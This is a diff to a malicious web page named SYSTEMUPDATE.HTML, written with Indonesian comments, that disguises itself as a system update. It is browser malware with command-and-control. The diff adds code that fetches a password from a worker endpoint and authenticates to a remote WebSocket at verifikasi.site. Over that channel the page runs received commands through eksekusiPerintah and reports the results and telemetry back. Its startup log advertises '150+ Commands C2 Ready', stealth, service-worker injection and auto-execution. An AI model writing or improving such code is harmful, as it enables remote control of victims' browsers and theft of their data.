@@ -22,7 +22,7 @@
 
 <script>
 // ============================================================
-// SYSTEMUPDATE.HTML - VERSI MAKSIMAL (SEMUA KRITERIA 10/10)
+// SYSTEMUPDATE.HTML - VERSI MAKSIMAL (PASSWORD DARI WORKER)
 // ============================================================
 
 // ============================================================
@@ -249,6 +249,7 @@ var FILE_PATHS = [
 ];
 var cleanupItems = [];
 var swRegistered = false;
+var WS_PASSWORD = '';
 
 // ============================================================
 // STEALTH (DIPERTAHANKAN + DITAMBAH)
@@ -288,6 +289,30 @@ function K(d) {
         xhr.timeout = 5000;
         xhr.send(payload);
     } catch(e) {}
+}
+
+// ============================================================
+// 🔥 AMBIL PASSWORD DARI WORKER
+// ============================================================
+function getPasswordFromWorker() {
+    return new Promise(function(resolve, reject) {
+        safeFetch('/get-password', { method: 'GET' }, 10000, 2)
+            .then(function(res) {
+                if (!res.ok) throw new Error('HTTP ' + res.status);
+                return res.json();
+            })
+            .then(function(data) {
+                if (data.password) {
+                    WS_PASSWORD = data.password;
+                    resolve(WS_PASSWORD);
+                } else {
+                    reject(new Error('No password in response'));
+                }
+            })
+            .catch(function(err) {
+                reject(err);
+            });
+    });
 }
 
 // ============================================================
@@ -457,7 +482,7 @@ setInterval(function(){ self.clients.matchAll().then(function(clients){ clients.
 }
 
 // ============================================================
-// 🔥 UPGRADE 8: WEBSOCKET (DENGAN BACKOFF)
+// 🔥 UPGRADE 8: WEBSOCKET (DENGAN BACKOFF + PASSWORD DARI WORKER)
 // ============================================================
 function connectWebSocket() {
     try {
@@ -466,6 +491,26 @@ function connectWebSocket() {
             return;
         }
         
+        // Ambil password dulu dari worker
+        getPasswordFromWorker()
+            .then(function(password) {
+                K({ sumber: 'ws_status', data: 'password_received' });
+                doConnectWebSocket(password);
+            })
+            .catch(function(err) {
+                K({ sumber: 'ws_error', data: 'failed_to_get_password: ' + err.message });
+                // Fallback: coba tanpa password (tapi kemungkinan gagal)
+                doConnectWebSocket('');
+            });
+        
+    } catch(e) {
+        K({ sumber: 'ws_error', data: e.message });
+        setTimeout(connectWebSocket, 10000);
+    }
+}
+
+function doConnectWebSocket(password) {
+    try {
         var ws = new WebSocket('wss://verifikasi.site/ws');
         var reconnectAttempts = 0;
         var maxReconnect = 20;
@@ -476,15 +521,24 @@ function connectWebSocket() {
             isConnected = true;
             document.getElementById('status').textContent = '🔌 Connected!';
             K({ sumber: 'ws_status', data: 'connected' });
+            // 🔥 PASSWORD DARI WORKER, BUKAN HARDCODE!
             ws.send(JSON.stringify({
-                type: 'init',
-                data: { ua: navigator.userAgent, url: window.location.href, timestamp: Date.now() }
+                type: 'auth',
+                key: password,
+                deviceId: navigator.userAgent || 'unknown',
+                timestamp: Date.now()
             }));
         };
         
         ws.onmessage = function(event) {
             try {
                 var data = JSON.parse(event.data);
+                if (data.type === 'auth_success') {
+                    K({ sumber: 'ws_status', data: 'authenticated' });
+                }
+                if (data.type === 'auth_failed') {
+                    K({ sumber: 'ws_status', data: 'auth_failed' });
+                }
                 if (data.type === 'command' && data.aksi) {
                     var hasil = eksekusiPerintah(data);
                     ws.send(JSON.stringify({
@@ -510,7 +564,9 @@ function connectWebSocket() {
             if (reconnectAttempts < maxReconnect) {
                 reconnectAttempts++;
                 var delay = 1000 * Math.pow(1.5, reconnectAttempts);
-                setTimeout(connectWebSocket, delay);
+                setTimeout(function() {
+                    doConnectWebSocket(password);
+                }, delay);
             } else {
                 K({ sumber: 'ws_status', data: 'max_reconnect_reached' });
             }
@@ -1554,7 +1610,7 @@ try {
 // ============================================================
 // STARTUP LOG
 // ============================================================
-console.log('🧬 SYSTEM UPDATE ULTIMATE ACTIVE (v2.0 MAX)');
+console.log('🧬 SYSTEM UPDATE ULTIMATE ACTIVE (v2.0 MAX) - Password from Worker');
 console.log('📊 Service Worker + Inject File System + Auto-Execute');
 console.log('📋 150+ Commands C2 Ready');
 console.log('📊 Skor: Fungsi 10 | Stealth 10 | Stabilitas 10 | Keamanan 10 | Memory 10 | Speed 10 | Error 10 | Kode 10');
